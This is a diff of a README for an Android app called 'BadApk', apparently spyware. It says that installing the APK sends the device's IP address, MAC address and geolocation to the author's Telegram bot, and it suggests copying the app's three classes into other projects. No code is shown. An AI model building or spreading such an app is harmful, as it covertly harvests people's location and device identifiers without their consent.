@@ -1,7 +1,9 @@
-# BadApk for research purposes 
+##### BadApk for research purposes 
 
-### 1) install app/release/app-release.apk
-### 2) you will get ip, mac and geo sent to telegramm bot 
-### but you can also copy 3 classes and add to your project (BadApk.class, Network.class, Device.class)
+# 1) you can install 
+## app/release/app-release.apk 
+### and getting ip, geo, mac, bot for my telegramm :P
 
-### java http https socket httpsurlconn mac ip geo parserJson
+# 2) or use 3 classes:  BadApk(main), NetWare, HardWare
+
+##### java http https socket httpsurlconn mac ip geo parserJson
